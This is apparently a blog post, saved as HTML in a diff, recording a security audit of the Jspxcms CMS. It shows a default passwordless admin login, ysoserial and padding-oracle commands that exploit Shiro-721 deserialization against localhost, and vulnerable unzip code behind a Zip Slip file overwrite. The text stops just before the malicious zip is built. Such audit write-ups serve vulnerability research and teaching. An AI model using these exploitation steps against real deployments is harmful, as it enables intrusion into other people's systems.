@@ -1,0 +1,452 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Jspxcms审计记录 | _0xf4n9x_'s Blog</title><meta name="author" content="_0xf4n9x_"><meta name="copyright" content="_0xf4n9x_"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="0x00 技术栈 0x01 组件依赖 0x02 功能点熟悉 0x03 默认不安全配置 0x04 RCE Shiro 721反序列化漏洞 Zip Slip任意文件覆盖漏洞 Freemarker SSTI   0x05 XSS 0x06 SSRF HttpClient.execute() URL.openConnection()    0x00 技术栈该项目使用了SpringMVC框架、Spring">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jspxcms审计记录">
+<meta property="og:url" content="https://0xf4n9x.github.io/jspxcms-code-audit-learn.html">
+<meta property="og:site_name" content="_0xf4n9x_&#39;s Blog">
+<meta property="og:description" content="0x00 技术栈 0x01 组件依赖 0x02 功能点熟悉 0x03 默认不安全配置 0x04 RCE Shiro 721反序列化漏洞 Zip Slip任意文件覆盖漏洞 Freemarker SSTI   0x05 XSS 0x06 SSRF HttpClient.execute() URL.openConnection()    0x00 技术栈该项目使用了SpringMVC框架、Spring">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0xf4n9x.github.io/img/post/jspxcms-code-audit-learn/3.png">
+<meta property="article:published_time" content="2022-08-17T12:44:52.000Z">
+<meta property="article:modified_time" content="2022-08-17T12:44:52.000Z">
+<meta property="article:author" content="_0xf4n9x_">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="code-audit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0xf4n9x.github.io/img/post/jspxcms-code-audit-learn/3.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://0xf4n9x.github.io/jspxcms-code-audit-learn.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-YRH7DCY1TL"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-YRH7DCY1TL');
+</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;3f9a5286f0c84213b902626e6f7a5081&quot;}"></script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Jspxcms审计记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-08-17 20:44:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="_0xf4n9x_'s Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/post/jspxcms-code-audit-learn/3.png')"><nav id="nav"><span id="blog-info"><a href="/" title="_0xf4n9x_'s Blog"><span class="site-name">_0xf4n9x_'s Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Jspxcms审计记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-08-17T12:44:52.000Z" title="Created 2022-08-17 20:44:52">2022-08-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-08-17T12:44:52.000Z" title="Updated 2022-08-17 20:44:52">2022-08-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">3.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>14min</span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/jspxcms-code-audit-learn.html#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li><a href="#0x00-%E6%8A%80%E6%9C%AF%E6%A0%88">0x00 技术栈</a></li>
+<li><a href="#0x01-%E7%BB%84%E4%BB%B6%E4%BE%9D%E8%B5%96">0x01 组件依赖</a></li>
+<li><a href="#0x02-%E5%8A%9F%E8%83%BD%E7%82%B9%E7%86%9F%E6%82%89">0x02 功能点熟悉</a></li>
+<li><a href="#0x03-%E9%BB%98%E8%AE%A4%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE">0x03 默认不安全配置</a></li>
+<li><a href="#0x04-rce">0x04 RCE</a><ul>
+<li><a href="#Shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Shiro 721反序列化漏洞</a></li>
+<li><a href="#zip-slip%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E">Zip Slip任意文件覆盖漏洞</a></li>
+<li><a href="#freemarker-ssti">Freemarker SSTI</a></li>
+</ul>
+</li>
+<li><a href="#0x05-xss">0x05 XSS</a></li>
+<li><a href="#0x06-ssrf">0x06 SSRF</a><ul>
+<li><a href="#httpclientexecute">HttpClient.execute()</a></li>
+<li><a href="#urlopenconnection">URL.openConnection()</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="0x00-技术栈"><a href="#0x00-技术栈" class="headerlink" title="0x00 技术栈"></a>0x00 技术栈</h2><p>该项目使用了SpringMVC框架、Spring Data JPA框架，Hibernate作为数据库持久化框架，Shiro作为安全框架，以及Freemarker模版引擎。</p>
+<h2 id="0x01-组件依赖"><a href="#0x01-组件依赖" class="headerlink" title="0x01 组件依赖"></a>0x01 组件依赖</h2><p>通过观察Maven同步的依赖库，发现部分使用的组件和版本如下。</p>
+<table>
+<thead>
+<tr>
+<th>组件</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>commons-beanutils</td>
+<td>1.9.3</td>
+</tr>
+<tr>
+<td>commons-collections</td>
+<td>3.2.2</td>
+</tr>
+<tr>
+<td>commons-logging</td>
+<td>1.1.3</td>
+</tr>
+<tr>
+<td>freemarker</td>
+<td>2.3.28</td>
+</tr>
+<tr>
+<td>shiro-core</td>
+<td>1.3.2</td>
+</tr>
+<tr>
+<td>hibernate-core</td>
+<td>5.0.12</td>
+</tr>
+<tr>
+<td>log4j</td>
+<td>1.2.17</td>
+</tr>
+<tr>
+<td>snakeyaml</td>
+<td>1.17</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-功能点熟悉"><a href="#0x02-功能点熟悉" class="headerlink" title="0x02 功能点熟悉"></a>0x02 功能点熟悉</h2><p>在正式进行审计前，应当对这个Web应用的相关功能点了解的足够全面、足够熟悉。</p>
+<p>由于该项目是个开源项目，在官网也提供了使用手册，通过查阅文档可以更加全面的了解该应用的所有功能点。当然，也可以在安装该环境后，自行探索相关功能点。</p>
+<h2 id="0x03-默认不安全配置"><a href="#0x03-默认不安全配置" class="headerlink" title="0x03 默认不安全配置"></a>0x03 默认不安全配置</h2><p>通过查阅文档发现该应用存在管理后台。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/0.png"></p>
+<p>管理员账户名为admin，默认无密码就可以直接登录进去。除此之外，此处的登录功能连验证码都未设置，存在被暴力破解的风险。</p>
+<h2 id="0x04-RCE"><a href="#0x04-RCE" class="headerlink" title="0x04 RCE"></a>0x04 RCE</h2><h3 id="Shiro-721反序列化漏洞"><a href="#Shiro-721反序列化漏洞" class="headerlink" title="Shiro 721反序列化漏洞"></a>Shiro 721反序列化漏洞</h3><p>通过如上使用到的依赖组件，可得知使用到了1.3.2版本的Shiro，满足Padding Oracle Attack漏洞的条件，且存在1.9.3版本的commons-beanutils，可以直接使用CommonsBeanutils1链进行攻击。虽然该漏洞存在，但在实际场景中不太容易复现成功。</p>
+<p>首先使用ysoserial生成反序列化payload。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">&quot;open -a Calculator&quot;</span> &gt; rce.ser</span><br></pre></td></tr></table></figure>
+
+<p>第二步，获取一个有效的rememberMe。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/1.png"></p>
+<p>然后通过<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/wuppp/shiro_rce_exp">https://github.com/wuppp/shiro_rce_exp</a>这个工具，进行爆破。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exp.<span class="property">py</span> <span class="attr">http</span>:<span class="comment">//127.0.0.1:8088/ tfG3gjvoIwe+kHjzfNRddP9QL7uy2/GeTBASaYZ83WW6vaGZCgUDp2TfrOVBvflVyxuJ+yGzGvyjDcK031vUCzdfadQ6TWIjFrVuRoqCeZdDCwqP7gWSf4HoONl8QGdWsPHH6D4agsz1ZRmWwen5uyzcVpZdjKFzv5117tSHFHPj+hcgmfL0L+v90TKHmgiWLSiEADvbL/qfmCo8HQCYtkK6DxuWQ35IvSoOCRaV5GpeKRlvcJVejGiqKQsx20N12IBKxIQBJ1htcyh3SJic8sQT6anMnNKe/FoRmOTxhbIwnzwCqGrDfJw1otx1YBLJTcfeXDuDk/41eJ3pLQ2VTuPdU/gIu/p8zf/7APjcQDI8C2wljK8zKkn4JwDt1/jb25zxw05FohDyusuQAc+TRBkyM6s1zk7ARDnyG9PQeqUdCxeubu5rbDxFVQM0bTWkL1fnqtt/fciGVU84aonJA2uUYIOI5xrdqUDm1ySOHHZGYWu8l109tt/aIJrdL2xxyK7BL6Ul3Ttd4Nw0SQqO0FaUWV2IO/oBandsk7kavfmdN+LvX30T7iLqIUehhprLChbJX4z8asfm4VRL/dJBzr6Z14U/cW8l90ULB4Z4qU3RbIdl+yiODUUk7exp/exwjeKrdd068p0yTiZYbx+q8BcAgugBILOeS791WJMm2zFwDumcDtOM7S+5BpqRQXUrCwpthYy9drXPpyCrcbkFLRqdArYBWWpwx07VaqmPioCSX7klaicZtH9ho6D4fEWZ/9oWm9Angj6+GaTn0Qlp1g== rce.ser</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破了几个小时后，终于爆出rememberMe cookies。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/2.png"></p>
+<p>将如上爆出的rememberMe cookies放置在BurpSuite中，并发包，可以发现计算机成功弹出。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/3.png"></p>
+<h3 id="Zip-Slip任意文件覆盖漏洞"><a href="#Zip-Slip任意文件覆盖漏洞" class="headerlink" title="Zip Slip任意文件覆盖漏洞"></a>Zip Slip任意文件覆盖漏洞</h3><p>通过<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1:8088/cmscp/index.do">http://127.0.0.1:8088/cmscp/index.do</a>，使用admin账户加空密码登录进后台，在后台可以发现有相关上传功能。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/4.png"></p>
+<p>尝试上传一个普通的文本文件，是能正常访问的，但当上传jsp后缀时，访问就会404。</p>
+<p>查看上传的文件的目录权限，可发现并无执行权限。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -al src/main/webapp/uploads/<span class="number">1</span> </span><br><span class="line">total <span class="number">16</span></span><br><span class="line">drwxr-xr-x  <span class="number">4</span> r00t  staff  <span class="number">128</span> <span class="title class_">Mar</span> <span class="number">16</span> <span class="number">12</span>:<span class="number">45</span> .</span><br><span class="line">drwxrwxr-x  <span class="number">4</span> r00t  staff  <span class="number">128</span> <span class="title class_">Mar</span> <span class="number">16</span> <span class="number">12</span>:<span class="number">27</span> ..</span><br><span class="line">-rw-r--r--  <span class="number">1</span> r00t  staff  <span class="number">288</span> <span class="title class_">Mar</span> <span class="number">16</span> <span class="number">12</span>:<span class="number">30</span> test.<span class="property">jsp</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> r00t  staff    <span class="number">5</span> <span class="title class_">Mar</span> <span class="number">16</span> <span class="number">12</span>:<span class="number">28</span> test.<span class="property">txt</span></span><br></pre></td></tr></table></figure>
+
+<p>继续将目光盯向ZIP文件上传功能，上传一个压缩包，并抓包。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/5.png"></p>
+<p>回到网页，可以发现压缩包中的文件被自动解压了。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/6.png"></p>
+<p>回到IDEA中，审计zip上传相关方法。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">RequiresPermissions</span>(<span class="string">&quot;core:web_file_2:zip_upload&quot;</span>)</span><br><span class="line">@<span class="title class_">RequestMapping</span>(<span class="string">&quot;zip_upload.do&quot;</span>)</span><br><span class="line">public <span class="keyword">void</span> <span class="title function_">zipUpload</span>(@<span class="title class_">RequestParam</span>(value = <span class="string">&quot;file&quot;</span>, required = <span class="literal">false</span>) <span class="title class_">MultipartFile</span> file, <span class="title class_">String</span> parentId,</span><br><span class="line">		<span class="title class_">HttpServletRequest</span> request, <span class="title class_">HttpServletResponse</span> response, <span class="title class_">RedirectAttributes</span> ra) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">	<span class="variable language_">super</span>.<span class="title function_">zipUpload</span>(file, parentId, request, response, ra);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>zipUpload</code>方法，在其中使用到了<code>AntZipUtils.unzip</code>方法进行解压缩。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">void</span> <span class="title function_">zipUpload</span>(<span class="title class_">MultipartFile</span> file, <span class="title class_">String</span> parentId, <span class="title class_">HttpServletRequest</span> request,</span><br><span class="line">		<span class="title class_">HttpServletResponse</span> response, <span class="title class_">RedirectAttributes</span> ra) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">	<span class="title class_">Site</span> site = <span class="title class_">Context</span>.<span class="title function_">getCurrentSite</span>();</span><br><span class="line">	<span class="title class_">FileHandler</span> fileHandler = <span class="title function_">getFileHandler</span>(site);</span><br><span class="line">	<span class="keyword">if</span> (!(fileHandler <span class="keyword">instanceof</span> <span class="title class_">LocalFileHandler</span>)) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;ftp cannot support ZIP.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title class_">LocalFileHandler</span> localFileHandler = (<span class="title class_">LocalFileHandler</span>) fileHandler;</span><br><span class="line">	<span class="title class_">String</span> base = <span class="title function_">getBase</span>(site);</span><br><span class="line">	<span class="comment">// parentId = parentId == null ? base : parentId;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="title class_">Validations</span>.<span class="title function_">uri</span>(parentId, base)) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;invalidURI&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title class_">File</span> parentFile = localFileHandler.<span class="title function_">getFile</span>(parentId);</span><br><span class="line">	<span class="title class_">File</span> tempFile = <span class="title class_">FilesEx</span>.<span class="title function_">getTempFile</span>();</span><br><span class="line">	file.<span class="title function_">transferTo</span>(tempFile);</span><br><span class="line">	<span class="title class_">AntZipUtils</span>.<span class="title function_">unzip</span>(tempFile, parentFile);</span><br><span class="line">	tempFile.<span class="title function_">delete</span>();</span><br><span class="line"></span><br><span class="line">	logService.<span class="title function_">operation</span>(<span class="string">&quot;opr.webFile.zipUpload&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + file.<span class="title function_">getOriginalFilename</span>(), <span class="literal">null</span>, <span class="literal">null</span>, request);</span><br><span class="line">	logger.<span class="title function_">info</span>(<span class="string">&quot;zip upload file, name=&#123;&#125;.&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + file.<span class="title function_">getOriginalFilename</span>());</span><br><span class="line">	<span class="title class_">Servlets</span>.<span class="title function_">writeHtml</span>(response, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进之，如下，可以发现该方法并未对文件名做安全检查，这里可能容易存在zip文件任意解压漏洞。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unzip</span>(<span class="params">File zipFile, File destDir, <span class="built_in">String</span> encoding</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (destDir.<span class="title function_">exists</span>() &amp;&amp; !destDir.<span class="title function_">isDirectory</span>()) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;destDir is not a directory!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title class_">ZipFile</span> zip = <span class="literal">null</span>;</span><br><span class="line">	<span class="title class_">InputStream</span> is = <span class="literal">null</span>;</span><br><span class="line">	<span class="title class_">FileOutputStream</span> fos = <span class="literal">null</span>;</span><br><span class="line">	<span class="title class_">File</span> file;</span><br><span class="line">	<span class="title class_">String</span> name;</span><br><span class="line">	byte[] buff = <span class="keyword">new</span> byte[<span class="variable constant_">DEFAULT_BUFFER_SIZE</span>];</span><br><span class="line">	int readed;</span><br><span class="line">	<span class="title class_">ZipEntry</span> entry;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title class_">StringUtils</span>.<span class="title function_">isNotBlank</span>(encoding)) &#123;</span><br><span class="line">				zip = <span class="keyword">new</span> <span class="title class_">ZipFile</span>(zipFile, encoding);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				zip = <span class="keyword">new</span> <span class="title class_">ZipFile</span>(zipFile);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="title class_">Enumeration</span>&lt;?&gt; en = zip.<span class="title function_">getEntries</span>();</span><br><span class="line">			<span class="keyword">while</span> (en.<span class="title function_">hasMoreElements</span>()) &#123;</span><br><span class="line">				entry = (<span class="title class_">ZipEntry</span>) en.<span class="title function_">nextElement</span>();</span><br><span class="line">				name = entry.<span class="title function_">getName</span>();</span><br><span class="line">				name = name.<span class="title function_">replace</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title class_">File</span>.<span class="property">separatorChar</span>);</span><br><span class="line">				file = <span class="keyword">new</span> <span class="title class_">File</span>(destDir, name);</span><br><span class="line">				<span class="keyword">if</span> (entry.<span class="title function_">isDirectory</span>()) &#123;</span><br><span class="line">					file.<span class="title function_">mkdirs</span>();</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="comment">// 创建父目录</span></span><br><span class="line">					file.<span class="title function_">getParentFile</span>().<span class="title function_">mkdirs</span>();</span><br><span class="line">					is = zip.<span class="title function_">getInputStream</span>(entry);</span><br><span class="line">					fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">					<span class="keyword">while</span> ((readed = is.<span class="title function_">read</span>(buff)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">						fos.<span class="title function_">write</span>(buff, <span class="number">0</span>, readed);</span><br><span class="line">					&#125;</span><br><span class="line">					fos.<span class="title function_">close</span>();</span><br><span class="line">					is.<span class="title function_">close</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (fos != <span class="literal">null</span>) &#123;</span><br><span class="line">				fos.<span class="title function_">close</span>();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">				is.<span class="title function_">close</span>();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (zip != <span class="literal">null</span>) &#123;</span><br><span class="line">				zip.<span class="title function_">close</span>();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (<span class="title class_">IOException</span> e) &#123;</span><br><span class="line">		logger.<span class="title function_">error</span>(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造一个恶意的zip压缩包。</p>
